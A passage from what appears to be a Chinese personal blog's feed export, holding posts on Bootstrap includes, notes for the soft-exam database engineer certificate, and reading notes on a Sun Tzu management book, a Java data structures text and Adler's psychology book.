class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class=&quot;&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;div class=&quot;&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;div class=&quot;&quot;&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure></li><li><p>Bootstrap框架引用代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;http://how2j.cn/study/js/jquery/2.0.0/jquery.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;link href=&quot;http://how2j.cn/study/css/bootstrap/3.3.6/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class="line">&lt;script src=&quot;http://how2j.cn/study/js/bootstrap/3.3.6/bootstrap.min.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>数据库系统工程师（软考中级）</title>
      <link href="/2018/09/08/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%B7%A5%E7%A8%8B%E5%B8%88%EF%BC%88%E8%BD%AF%E8%80%83%EF%BC%89/"/>
      <url>/2018/09/08/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E5%B7%A5%E7%A8%8B%E5%B8%88%EF%BC%88%E8%BD%AF%E8%80%83%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>大二下学期考过了软考中级证书。趁自己还记得，写点东西记录一下。<br><a id="more"></a></p><h1 id="写在前面的几句废话"><a href="#写在前面的几句废话" class="headerlink" title="写在前面的几句废话"></a>写在前面的几句废话</h1><p>这个是软考中级证书的一门，含金量还行吧，现在还没在什么招聘要求上看到它。听师兄说国企会在工资考评上算上它，有它能加几百块钱，不知道是不是真的。考它的主要原因是大二上学了数据库原理。大二下学期又比较闲，想以考带学，查漏补缺。<br>简单介绍一下吧。数据库系统工程师资格（水平）考试，一年一次，大概在3 4月份网上报名，5月份考试。考试上午一场，下午一场。两场满分75,45分通过。上午题全是选择题，内容是理论知识，下午5道大题填空或者回答。<br>没考试之前，我对于数据库的学习主要是大二一学期都按习题敲代码。对于增删查改，条件查询，视图、储存过程、触发器的代码比较熟悉。期末考虽然也有理论，但就是死记硬背，没有深入学透。<br>考取这门证书，让我收获许多理论知识。诸如范式、关系代数。还有可怕的计算机专业知识的考查(ಥ_ಥ)比如校验码，补码，磁盘容量计算，流水线，计算机网络。。。<br>敲代码以后可以搬砖。而学习这些理论知识比如范式、关系代数有什么用，我之前也有一些困惑。在知乎上有相似的问题，下面有一些不错的回答。<a href="https://www.zhihu.com/question/273489729" target="_blank" rel="noopener">https://www.zhihu.com/question/273489729</a><br>总之，经过这次考证最初加强数据库理论知识的目的达到了。不过，越学越觉得自己知识漏洞越多。。。</p><h1 id="首先"><a href="#首先" class="headerlink" title="首先"></a>首先</h1><p>这门考试仅仅需要准备两本书，这两本都是考试官方指定用书。<br>《数据库系统工程师2012至2017年试题分析与解答》这本是历年真题有超详细的解析，需认真刷完。<br>《数据库系统工程师考试全程指导》第二本大砖头用于对理论查漏补缺，不买也行，我就没买。by图书馆有的借。</p><h1 id="当时对我有帮助的博文。"><a href="#当时对我有帮助的博文。" class="headerlink" title="当时对我有帮助的博文。"></a>当时对我有帮助的博文。</h1><p>对于三级模式（ 外模式，内模式，模式）刘慰老师的回答让我有种恍然大悟的感觉，推荐阅读！。<br><a href="https://www.zhihu.com/question/38737183/answer/93294527" target="_blank" rel="noopener">https://www.zhihu.com/question/38737183/answer/93294527</a></p><p>列了一些常见的概念 <a href="https://blog.csdn.net/BI_25_RED/article/details/52564110" target="_blank" rel="noopener">https://blog.csdn.net/BI_25_RED/article/details/52564110</a></p><p>我的软考之路 <a href="https://www.cnblogs.com/clnchanpin/p/7358003.html" target="_blank" rel="noopener">https://www.cnblogs.com/clnchanpin/p/7358003.html</a></p><h1 id="我个人做的一小部分笔记"><a href="#我个人做的一小部分笔记" class="headerlink" title="我个人做的一小部分笔记"></a>我个人做的一小部分笔记</h1><h3 id="上午题常见的概念"><a href="#上午题常见的概念" class="headerlink" title="上午题常见的概念"></a>上午题常见的概念</h3><ul><li><p>s读锁（共享） 任何人只能读<br>x写锁（排他） 只有那个人可以读或写</p></li><li><p>并发，就像一个人（cpu）喂2个孩子（程序），轮换着每人喂一口，表面上两个孩子都在吃饭。并行，就是2个人喂2个孩子，两个孩子也同时在吃饭。<br>串行：喂完一个再喂第二个。</p></li><li><p>脏读 修改之后 被别人读到 但这个修改又被撤回作废 别人读到就是脏数据。简单来说就是读到的数据是人家不要的。<br>幻读 一个事务两次查询，第二次比第一次多了或者少了几行几列数据<br>不可重复读 和幻读差不多 不过幻读重点在insert<br>更新丢失 回滚多了</p></li><li><p>undo 撤销 完成之后<br>rollback 未全部完成<br>redo日志 数据修改后的<br>undo日志 数据修改前的</p></li><li><p>集成测试［在概要设计阶段］：接口，通信 黑<br>确认测试［需求设计阶段］：最终用户<br>系统测试<br>恢复测试即容错测试</p></li><li><p>瀑布模型（理想）一个个阶段过，不回头<br>原型（动态定义需求）<br>螺旋模型 结合瀑布和演化并加入风险 小系统一圈一圈走阶段<br>喷泉模型 （迭代）各阶段交叉‼️对风险进行识别和分析</p></li><li><p>标记耦合和控制耦合的区别：标记耦合传递不是简单的变量而是数据结构</p></li><li><p>人耳可听到的范围是20hz-20khz<br>日常说话300-3400hz<br>乐器20hz-20khz</p></li><li><p>共享性是指各结点数据共享。<br>自制性是指每个节点对本地数据都能独立管理。<br>可用性是指当某一场地故障时，系统可以使用其他场地上的副本，而不至于使整个系统瘫痪。<br>分布性是指数据在不同场地上的储存。</p></li><li><p>笛卡尔积 的个数 等于两个个数相乘<br>π投影 垂直 就一个表中只需要姓名和成绩，其他过滤<br>∂选择 水平</p></li><li><p>中继器（转发器） 物理层<br>网桥 数据链路层<br>路由器 网络层<br>网关（协议转换，交换机） 高层<br>集线器 物理层</p></li><li><p>超健：唯一标识（知道学号姓名就可以知道她的年龄班级）<br>候选健：超健基础上，不含多余属性（学号姓名知道一个就行了，但加一个课程名才知成绩）<br>主键：候选健中随意挑一个<br>候选健都是主属性</p></li><li><p>需求分析：数据流图和数据字典。<br>逻辑设计：设计关系模式及相关视图。<br>物理设计：设计数据的物理组织如索引。</p></li><li><p>将所有对象进行分类，然后确定各类的实体，找出属性，这一过程称为聚集。<br>从实体中抽象出子类和父类这一过程称作概括。</p></li><li><p>事物的永久性是指事物一旦提交，其对数据库的影响是永久的，即使系统发生故障也不受影响，提交可以看作是系统对用户的承诺。</p></li></ul><h3 id="说说下午题中一些油腻腻的套路。"><a href="#说说下午题中一些油腻腻的套路。" class="headerlink" title="说说下午题中一些油腻腻的套路。"></a>说说下午题中一些油腻腻的套路。</h3><ul><li><p>第一大题（数据流图）<br>加工的输入数据流和输出数据流要平衡，保证加工的输出数据流都有对应的输入和输出数据流。<br>绘制过程中可能出现的错误：<br>数据黑洞：只进不出<br>数据奇迹：只出不进<br>数据灰洞：加工不出输出流</p></li><li><p>第二大题（sql代码）<br>一个信息点一个信息的标记出来，别漏了。<br>尤其喜欢让你补写GROUP BY。查询了多少个表，group by后面就要跟多少个表。当然函数比如avg（工资）不用。<br>补写where。查询多少个表，where是表数减一条。</p></li><li><p>第三大题（设计实体）<br>实体的关系不止于两个实体。喜欢考三个实体的关系。</p></li><li><p>第四大题（范式）<br>第二范式：消除了非主属性对主属性的部分依赖。缺点是数据冗余，修改、删除、插入异常<br>第三范式：消除了非主属性对主属性的传递依赖。缺点是删除、插入异常。<br>BNF：消除了主属性对码的部分传递函数依赖。</p></li><li><p>第五大题，略。</p></li></ul><div class="aplayer" data-id="30953120" data-server="netease" data-type="song" data-autoplay="true"></div>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>《华杉讲透孙子兵法》读书笔记</title>
      <link href="/2018/09/08/%E3%80%8A%E5%8D%8E%E6%9D%89%E8%AE%B2%E9%80%8F%E5%AD%99%E5%AD%90%E5%85%B5%E6%B3%95%E3%80%8B/"/>
      <url>/2018/09/08/%E3%80%8A%E5%8D%8E%E6%9D%89%E8%AE%B2%E9%80%8F%E5%AD%99%E5%AD%90%E5%85%B5%E6%B3%95%E3%80%8B/</url>
      
        <content type="html"><![CDATA[<p>这本书借孙子兵法讲现代的公司管理，商战。<br><a id="more"></a></p><h4 id="实力是最厉害的计谋"><a href="#实力是最厉害的计谋" class="headerlink" title="实力是最厉害的计谋"></a>实力是最厉害的计谋</h4><blockquote><p>1、“孙子兵法不是战法，是不战之法；不是战胜之法，是不战而胜之法；不是战而后胜之法，是先胜而后战之法。”<br>2、 “开炮的时候，胜负已定了。”<br>3、“打胜仗的军队，总是先获得胜利地位，获得取胜条件之后，才投入战斗。而打败仗的军队，总是冲上去就打，企图在战斗中捕捉机会侥幸获胜”<br>4、“作战就那一下子，我们99%的工作，都是准备工作。这个道理太深了。人们容易看到的是战利品的多少得失，时间、资源的分配，总是向收割倾斜，不是向准备倾斜。 只问耕耘，不问收获。我看到有的企业家，把收获的工作交给经理人，因为今天的收获都是他三年前耕耘下的。他把他的精力和关注点，投入新的耕耘，为未来作准备”  5、“”这在管理学上叫“沉默的证据”，真正的绝大多数，绝对的大概率事件，都沉默无言，所以你不知道。而那些小概率事件，以少击多居然打赢的，人人都替他大肆宣扬，一千年后你还知道，三千年的例子累积起来，倒显得比比皆是成了主流了。<br>6、“我们经营也是一样，你踏踏实实把产品，把服务做好，别老想着有什么“招”。实际上，奇谋诡道很容易，就那几招，其实技术含量很低，主要技术要点在于演戏要演得像而已。但是“五事七计”技术含量就太高了，全是真功夫，是人格，是智慧，是汗水，是时间，是积累。所以人们爱听三十六计，不爱听“五事七计”。<br>7、“关羽是典型的百战百胜，一败而亡。《孙子兵法》说，真正的善战者，无智名，无勇功，因为善战者不打那么多仗，只打容易的仗，不打跌宕起伏的仗，没有那么多可歌可泣的故事。故事都是讲给老百姓听的，关羽则恰恰和孙子的胜将标准相反，他威名赫赫，在民间是集道德、智慧、武功于一身的千古第一人，而在专业人士看来，关羽实误国之臣也。”<br>8、第二个观念，胜可知而不可为。探查敌我，便知道有没有胜算。如果没有胜算，你想上了战场再强取其胜，那是不可为。因为敌人也是身经百战，不是我们喊几句口号就能打败了。更何况口号人家也没比我们少喊。<br>9、什么叫竞争？竞争的本质是要你没法跟我争</p></blockquote><h1 id="赏罚分明"><a href="#赏罚分明" class="headerlink" title="赏罚分明"></a>赏罚分明</h1><blockquote><p>赏无度，则费而无恩；罚无度，则戮而无威。</p></blockquote><blockquote><p>杜牧注得准确：“信者，使人不惑于刑赏也。”信，就是赏罚分明，每个人都非常清楚，犯什么错受什么刑，立什么功受什么赏。</p></blockquote><blockquote><p>所以“赏其先得者”，就是夺得第一辆战车的士卒。因为先得者，往往是倡谋者。他先发动，大家才跟着一哄而上</p></blockquote><blockquote><p>贾林注解说：“专任智则贼，遍施仁则懦，固守信则愚，恃勇力则暴，令过严则残。五者兼备，各适其用，方可为将帅。”</p></blockquote><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><blockquote><p>绝大部分准备，都是“白准备”，因为准备本来就是“不防一万，只防万一”的，所以每一次有效准备背后，都有九千九百九十九次“白准备”。左史并非料事如神，料定吴军一定会来，他只是按操作规程，做好准备。吴军若不来，士兵们怨声载道，这事过去了，不会写进史书里，我们也不知道。吴军来了，他就名垂青史了。两千多年后我们还能知道这事，可见这样的事是很少发生<br>那开始时下着大雨，楚军列阵等着，吴军不来怎么办？那不白准备了吗？我们经常听见人说：“我白准备了，白浪费了。”这个观念就是兵法要反对的。《兵法百言》：“宁使我有虚防，无使彼得实尝。”宁可我白准备，也不能让他万一来了，让他得手。</p></blockquote><h2 id="判断"><a href="#判断" class="headerlink" title="判断"></a>判断</h2><blockquote><p>对敌人呢，就像李世民说的，观古今兵法，就一句话：“多方以误之。”想方设法引他失误。</p></blockquote><blockquote><p>兵法都很简单，难的是判断。比如那敌军来，你怎么知道他是来骚扰的，还是来总攻的呢？实际上我们无法知道。所以，毛泽东说：“一上战场，兵法全忘了。”随时有紧急情况要你处理决策，哪顾得上兵法。 怎么办，就要胸中有全局，是你调动敌人，不是敌人调动你。</p></blockquote><blockquote><p>方不上当，不失误，怎么办呢？等待，跟他熬，派间谍，各种布置安排。总之，一定要等到平衡打破，胜算已见，才能出战。</p></blockquote><blockquote><p>夫霸天下者有三戒：毋贪，毋忿，毋急。贪则多失，忿则多难，急则多蹶。夫审大小而图之，乌用贪？衡彼己而施之，乌用忿？酌缓急而布之，乌用急？君能戒此三者，于霸也近矣。”</p></blockquote><blockquote><p>这三件事，背景、形势，都差不多，处理各有参差，结果也不同。所以处大事，决大疑，要熟思是非，不要拘于往事成败，不可迁就一时之利害，更不可归罪于谋臣</p></blockquote><blockquote><p>曾国藩专门说过领导者要独立承担决策责任的问题。因为成败无定，不光是定计的问题。</p></blockquote><blockquote><p>那么，当你认为有几分把握的时候，先自己减去三分一厢情愿分，再想想。 当我们觉得有十分把握的时候，减去三分就是七分。假如我们的判断是准确的，那就有50%的概率获胜，那赢面已经非常大了。</p></blockquote><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><blockquote><p>不能“成功了都是自己伟大，失败了那是环境变化”。环境本来没义务等我，先能避害，然后才可趋利。因为利今天没有，明天还可以再图。而害却可能让我输掉老本，彻底出局。所以避害比趋利重要得多</p></blockquote><blockquote><p>下判断、做事业，要把握两条：趋利、避害。趋利和避害的权重，应该至少是相当的，五十对五十。但是，往往都成了七比三，甚至九比一。为什么，因为利往往在明处，在眼前，让人激动；而害在暗处，在远处，让人心生侥幸。我们经常看到人，去做一些利益极小，而隐患极大的事情。为什么呢？因为那利马上可以得到。而那害，那明明白白的害，他却不可救药地认为“不一定”。</p></blockquote><h3 id="奇兵"><a href="#奇兵" class="headerlink" title="奇兵"></a>奇兵</h3><blockquote><p>曹操注解说：“以五敌一，则三术为正，二术为奇。”如果有敌人并兵自守，不与我战，则有五倍于敌的兵力可攻。怎么攻呢，以三倍兵力为正兵出战，留两倍兵力在手作预备队等待出奇制胜</p></blockquote><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><blockquote><p>中国有句古话叫“不知者不为罪”，大错！不知就是最大的罪！你不知，怎么担当这责任管这事呢？</p></blockquote><blockquote><p>你如何能得到这张王牌呢？就是谁也没看到它的价值的时候，你先占了。那地，一直在那里，就像那牌，一直在那里，谁摸到是谁的，关键你得知道那张牌是王牌</p></blockquote><blockquote><p>不能因为你的队友是猪，你就跟着做猪</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>《Data Structures and Other Objects Using Java》读书笔记</title>
      <link href="/2018/09/08/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
      <url>/2018/09/08/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>书是从学校图书馆借的，豆瓣评分寥寥，但我觉得海星鸭<br><a id="more"></a></p><p><em>段落根据我认为重要程度排名。</em></p><ul><li><p>p84<br>为什么要给自己给一个类写clone的方法？而不是直接调用父类的复制方法。<br>举个栗子，把数组a拷贝到副本b。如果直接去调用父类的复制方法。它会做什么呢？它会把b的引用都指向数组a，也就是说它并没有真正意义上的复制，而是偷懒把新引用指向原本的数组。<br>这样做有什么问题呢？问题在于对a数组修改都会影响到拷贝的副本b。显然这不是我们想要的。<br>所以我们得自己写一个clone类，循环遍历数组，挨个复制。<br>笔记：大家都知道集合有length（）方法，不需要知道怎么实现，只要能用就行了。但当我们自己去写一个集合类的时候，写这个方法就必须要考虑到方方面面了。这本书重点不在于告诉人java有多少个API，而是这些类、方法的实现原理。只有当我们去重写的时候才会深度去思考程序的设计的原理。<br>比如得知数组的长度，那么写属性size就行了，因为数组是固定长度的。<br>但是要得知集合的长度，需要写一个方法遍历得知，因为集合是自动增长的。</p></li><li><p>p8<br>final变量即这个变量是最终版本，不可变更，不能被继承。另外final变量的名称全部大写 。<br>比如一个常量-273。如果把它写成final变量,则是final MINMUM_CELSIUS=-273。<br>什么时候用常量？如果直接写c&lt;-273，那么阅读程序的人会在这里停住，直到想起-273是最小摄氏度为止。<br>当然了，有些众所周知的公式，其原始形式更易识别。</p></li><li><p>用static修饰的话，即使没有生成该对象的实例，也可使用该方法。毕竟如果只是想使用该方法，也没有必要生成一个实例。<br>比如java自带Math类，没有生成实例也可以直接用它生成random随机数的方法 。(Math.random() * 100)。这条语句是意思是生成一个一百以内的随机数。<br>如果没有用static修饰，绝对不能激活空引用的方法。绝不能访问null引用的实例变量。两种情况下都会引发nullpointerexception异常。</p></li><li><p>变量分引用变量和普通变量。<br>除了八种基本类型之一的任何变量，其余都是引向某一对象的引用变量。<br>引用变量：<br>有些为了省事的程序员用“油门对象t正在工作”，而不使用，“t引用的油门对象正在工作”<br>笔记：t不是这个油门对象的命名而是这个油门对象的引用。</p></li><li><p>p49<br>关于取名。名字最好是描述性的词<br>存取方法：比如“toString”；get+，比如”getFlow”<br>修改方法：动词<br>有返回值的静态方法：名词</p></li><li><p>如果方法需要返回多个信息，那么返回数组是一个有效的手段。</p></li><li><p>集合类不用定义容量，每当包要满时，方法就会实现，使得容量翻倍。<br>m*2+1。加1是为了使得即使容量为零，这一动作仍能起作用。</p></li><li><p>如果没有指定修饰符，则为默认访问，也叫包访问。可以访问同一个一个包的类。</p></li><li><p>递归不只是尾递归。</p></li><li><p>java的易移植性：程序变成字节码，这些字节码由jar运行时环境编译，jar可以免费获得，所以程序可以在不同的机器间进行移植。</p></li><li><p>每一个方法有参数，前置条件，返回值。前置条件比如参数c&gt;-273。</p></li><li><p>接口代码单词一般以-able为后缀。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>《自卑与超越》读书摘录</title>
      <link href="/2018/09/08/%E3%80%8A%E8%87%AA%E5%8D%91%E4%B8%8E%E8%B6%85%E8%B6%8A%E3%80%8B/"/>
      <url>/2018/09/08/%E3%80%8A%E8%87%AA%E5%8D%91%E4%B8%8E%E8%B6%85%E8%B6%8A%E3%80%8B/</url>
      
        <content type="html"><![CDATA[<p>力荐这本书，让我受益匪浅。主要讲的是心智的成长与误区。<br><a id="more"></a></p><blockquote><p>发现她询问过的女孩中有百分之四十二想要当男孩，这意味着她们对自己的性别不满。当尚有一半人口处于失意和灰心之中时，又怎么可能解决爱情和婚姻问题呢？当女性始终面临着轻视，并认为自己只是男性的性对象，或是认为男性的见异思迁和不忠是天性使然时，这些问题能够轻易解决吗？</p></blockquote><blockquote><p>比如，有千千万万小说都是以新婚男女缔结良缘为结局，但那其实只是他们共同生活的开始。在这种情境下，小说常常将婚姻当作解决一切问题的灵丹妙药，就好像新婚夫妇从此一帆风顺，过上了幸福的生活。需要认识到的另一个重要事实是，爱情本身不能解决任何问题。爱情的形式各种各样，更有效的是靠努力、关心和合作解决婚姻的问题。</p></blockquote><blockquote><p>有人无法只爱一个人，他们必须得同时爱着两个人。只有这样才能让他们感到自由，他们可以从一个身边逃到另一个那里去，完全不用承担完整的爱情责任。两个都爱，等于谁都不爱。</p></blockquote><blockquote><p><strong>我们知道，决定一个人的并不是他所处的环境，而是他对自身处境的解读。</strong></p></blockquote><blockquote><p>爱情，以及它在婚姻中的圆满，是对异性伴侣最亲密的奉献，具体表现为生理上的吸引、相濡以沫的陪伴，以及生儿育女的共同愿望。</p></blockquote><blockquote><p>所有人都应该为自己的生活去挣钱，无视这一点的人会成为别人的负担。但如果孩子们只对挣钱感兴趣，便很容易脱离合作路线，一心只想着自己的利益。如果没有其他社会兴趣，只将“挣钱”当作唯一目标，为什么不能去抢、去坑蒙拐骗呢？就算不至于那么极端，就算拜金之下还残存有一丝社会兴趣，他们的行为对人类也不会有太多贡献</p></blockquote><blockquote><p>如果儿童从小就知道自己长大后想从事的职业，那他们的发展就简单多了。如果我们问他们长大想干什么，大部分儿童都会给出明确回答。<strong>然而，他们的答案通常并未经过认真思考。当他们说想当飞行员或汽车司机时，其实对自己所选择的职业并没有了解。我们的责任是挖掘出他们的回答下潜藏的动机，把握他们努力的方向，找出推动他们继续前进的因素，以及他们的目标和他们实现这个目标的方式。他们所选择的未来职业只是一种在他们看来体现了优越性的职业，但从这一选择上，我们可以发现其他的发展可能，去帮助他们实现目标。</strong></p></blockquote><blockquote><p>天才的训练都开始于幼年。我觉得，关于天才的问题将有助于了解整个课题。只有那些对人类的共同利益做出过卓越贡献的个体才被称为天才。我还想不出有哪位没能对人类做出任何贡献的天才。</p></blockquote><blockquote><p>四五岁前的努力和训练对孩子成年后的主要活动范围有着决定性影响。做职业指导时，我总要询问每个人的幼年生活，以及他们早年对什么最感兴趣。他们对这一时期的记忆可以准确地揭示出他们最常进行的训练：他们会透露自己的理想，以及这些理想在自己心目中的地位。后文中，我会回过来讲最初记忆的重要性。</p></blockquote><blockquote><p><strong>《罪与罚》中就是如此，主人公拉斯科利尼科夫在床上躺了两个月，考虑是否去杀人。他靠对自己质问“我是拿破仑，还是一只虱子”来鞭策自己。犯罪分子靠这样的幻想自我欺骗，自我激励。事实上，所有犯罪分子都知道，他们过着对社会无益的生活，也知道什么才是有用的生活。然而出于怯懦，他们拒绝有用的生活，而怯懦则是因为他们缺乏成为有用之材的能力。</strong>解决生命中的问题需要进行合作，他们对合作却一窍不通。之后，在想要逃脱自己的罪责时，我们会看见他们为自己辩护，想要博取宽容，“他有病”或是“他没工作”等等都被拿来当作借口。</p></blockquote><blockquote><p>碰儿童时必须多加小心。父母和孩子间温暖的拥抱和亲吻没有问题，只要没有不恰当地激起孩子的生理反应。成年人回忆童年时，经常有人跟我诉说在父母的书架上发现黄色读物或是看了色情电影之后的感受。最好不要让儿童接触到这些图书和影片。如果不在性欲上给孩子以刺激，可以避免很多麻烦。</p></blockquote><blockquote><p><strong>有时候，教师会对懒惰的学生说：“如果努力一点，你就能成为班上最聪明的学生。”如果不费吹灰之力就能获得这样的评价，他们为什么还要冒险去努力呢？也许一旦他们不再懒惰，就保不住这种深藏不露的聪明孩子的名声了。所以应该根据实际成绩来裁判，而不是他们本应能达到的目标。懒孩子的另一个优势是，只要他们稍稍使一点点力气，就能得到表扬。所有人都希望他们至少是已经开始努力了，热切地鼓励他们进一步提高，但其实同样的努力在勤奋的孩子身上根本就不值一提。就这样，懒孩子生活在他人的期待里。他们是被宠坏的孩子，从婴儿时期就开始习惯于期待不劳而获</strong></p></blockquote><blockquote><p>还有一些想要成为关注焦点的孩子，在周围环境不顺意时，就通过调皮捣蛋来获取关注。他们要么扰乱整个课堂，要么带领其他孩子逃学，要么不时惹是生非。责备和惩罚对他们毫无效果，只会让他们更加得意。他们宁愿被责罚也不愿被忽视，破坏行为所带来的不快惩罚对他们来说只是为了赢回关注所付出的合理代价。许多孩子只将惩罚视为个人挑战。他们把它当成竞争或比赛，看谁能坚持得更久。而赢家总是他们，因为主动权掌握在他们自己手中。所以有些与自己父母或老师作对的孩子，在接受惩罚时，不仅不会哭，还会笑。</p></blockquote><blockquote><p><strong>智力发展中最大的要素是兴趣，我们之前说过，能够阻碍兴趣发展的是灰心和恐惧，而不是缺乏遗传。毫无疑问，大脑的结构多少得自遗传，但它只是心智的工具，而非根源，</strong>而且如果大脑的损伤还没严重到我们现今所掌握的知识无法克服的程度，就仍然可以接受补偿性训练。在每种出类拔萃的能力背后，我们所发现的都是持久的兴趣和训练，而不是特异的遗传性状。</p></blockquote><blockquote><p><strong>“善”与“恶”，以及其他关于性格的表达，其意义都只存在于社会语境中。它们是在社会环境下，和其他人类共同培养训练出来的产物，它们蕴含着对一个人的行为是“有利他人”还是“损害他人”的判断。</strong>儿童出生前并没有能产生这一感知的社会环境</p></blockquote><blockquote><p>儿童和他们的父母也不应被告知智商分数。他们不了解测验的目的，也许会以为它代表着最终判决。教育最大的问题不在于儿童的极限，而在于他们的自我设限。如果孩子们知道他们的IQ分数低，也许就会丧失希望，认为自己与成功无缘。我们在教育中应该做的是尽力增强他们的自信和学习兴趣，破除生活中他们给自己的能力所加上的重重限制</p></blockquote><blockquote><p>现在有些学校已经采用视听结合的教学方法来上课，比如在传统课程中结合使用模型和图画。这一趋势值得鼓励并进一步发展。<strong>任何学科的最佳教学方式都是让它与现实生活紧密相关</strong>，让孩子能够看到教导的目的，并了解到所学内容的实用价值。有一个问题常常被提及，教孩子吸收知识和教会他们自我思考孰高孰低？在我看来，这两种方法不该割裂，而应该结合在一起。例如，结合造房子教数学就很生动有益，可以让他们算出需要多少木材，可以住多少人等等。</p></blockquote><blockquote><p>懒惰是野心与缺乏勇气并存的标志：野心如此之大，以至于人们看不到任何实现它的希望</p></blockquote><blockquote><p>在这类竞争中，女孩天生更有优势：在十六岁以前，无论身体还是心灵，她都比同龄男孩成长得快。结果可能就是她的哥哥放弃竞争，变得懒惰消极。这样的事情屡见不鲜。男孩有时会通过一些不那么光明磊落的手段来追求优势，比如吹牛和撒谎。在这种情形下，我们几乎可以立刻肯定女孩已经获得了胜利</p></blockquote><blockquote><p>这些性格特征并不只是见于人们清醒的时候。它们的痕迹体现于一切个性表达中，在睡梦中就更明显了。举例来说，长子女常常会做有关跌落的梦。他们本就处于顶端，但不确定自己是否能够一直保持这样的优势。而次子女则完全不同，他们常常勾勒出自己正在比赛的场面，或者是跟在火车后面奔跑，或者是骑着自行车比赛。有时候这些紧张匆忙的梦具有如此鲜明的特征，以至于我们可以轻易猜到做梦者是家中排行第二的孩子</p></blockquote><blockquote><p>有一种感觉一直吸引着教育者与心理学者的关注，那就是“害怕”。在个体心理学中，我们不再局限于寻找害怕产生的原因，而更注重探究它的目的。<strong>所有受宠爱的孩子都会害怕：透过害怕，他们能够得到关注</strong>于是他们将这种情绪建立在了自己的生活方式中。利用它，孩子可以成功地将母亲拖在身边。胆小的孩子往往都是娇生惯养的，而且希望能够继续被娇纵。</p></blockquote><blockquote><p><strong>有一个娇惯的孩子常常会在黑暗中大哭。一天夜里，当母亲听到哭声赶过来时，她问孩子：“你为什么会害怕？”孩子回答：“因为太黑了。”但母亲现在已经认识到了他这种行为的目的。“那我进来之后，”她说，“就没那么黑了吗？”黑暗本身并不重要，孩子对黑暗的恐惧仅仅意味着他不想与母亲分开。他的所有情感、所有力气和所有精神都专注于要创造一种情境，在这种情境下，他的母亲就不得不来照看他，再次回到他身边</strong>他努力用哭泣、喊叫、无法入睡或其他能让自己成为一个麻烦小家伙的方式，将母亲吸引到自己身边。</p></blockquote><blockquote><p><strong>家庭中无需权威</strong>，但却需要真正的合作。父亲与母亲必须通力合作，在有关孩子教育的问题上应当处处保持一致。无论父亲还是母亲，都不应表现出对某个孩子的偏爱，这一点极其重要。偏爱的危害怎么强调也不为过。孩子在童年时期出现的沮丧感，其根源几乎都在于感到有人比自己更受宠爱。</p></blockquote><blockquote><p>夫妻之间的性关系不容忽视。<strong>同样重要的是，当父母在向子女解释有关性的问题时，要小心不要一厢情愿地涉及太多，只要告诉孩子他们想要知道的，同时也是在他们当前的年龄阶段里能够理解的内容，就足够了。我认为当今有一种不恰当的倾向，那就是人们告诉孩子们的远远超过他们能够理解的。这可能诱发出一些孩子还没有准备好要应对的兴趣和感觉。性可能从此就变成了一件稀松平常、无足轻重的事情。这并不比过去人们在性问题上对孩子们欺骗或是讳莫如深来得高明。最好的方式，是找出孩子们真正好奇的是什么，实事求是地为他们做出解答，而不要将我们认为是常识的东西强加给他们。我们一定要保护他们的信任感，将我们正在与他们合作的感觉延续下去，至于我们真正应当关心的，是帮助孩子找到他们问题的解决之道。如果这样做了，我们就不会有太大的偏差</strong></p></blockquote><blockquote><p>一位父亲的职责可以概括为几句话。他必须证明，自己是妻子的好伴侣，是孩子的好伙伴，也是社会的好成员。他必须妥善处理生活中的三大问题——工作、友谊和爱情，还必须在照顾和保护家庭时与妻子平等合作。他不应忘记，女性在家庭生活中的地位是不容贬抑的。贬低母亲的地位并非他应该做的，相反，他应当与妻子相互配合。需要特别强调的一个重点在于，即便父亲是家庭的主要经济支柱，这也是夫妻共同的收获。他绝不可摆出一副施予者的模样，把家庭中所有其他人都变成接受者。对于和谐的婚姻来说，真相是，他去赚钱只不过是家庭劳动分工的结果。许多父亲利用他们的经济地位来作为统治家庭的理由。家庭中不应存在统治，任何可能导致不平等感的事情都应当被避免。</p></blockquote><blockquote><p>由于婚姻是平等的合作关系，所以没有哪一方应该凌驾于另一方之上。这一点应当值得更深入的探讨，而不是满足于我们已经习惯的状态。<strong>在家庭生活的所有行为中，最不需要的就是权威的存在，如果家庭中某一位成员特别重要，或是被认为其价值远远大于其他家庭成员，那就太不幸了</strong>。如果父亲脾气暴躁，试图掌控家庭中的其他成员，那么他的儿子对于男人的概念就会有所偏差。而他的女儿则会更加痛苦。在未来的生活中，她们都会将男人看成暴君。对她们来说，婚姻就意味着某种屈从和奴役。有时，当成年以后，她们还可能发展出对同性的兴趣，以此来寻求自我保护，对抗男性。</p></blockquote><blockquote><p>众所周知，继母不好当，失去了亲生母亲的孩子常常会与她们对抗。但问题并非不能解决的，我也曾经看到过许多非常成功的继母。只是太多时候继母都没有真正明白情况究竟是怎样的。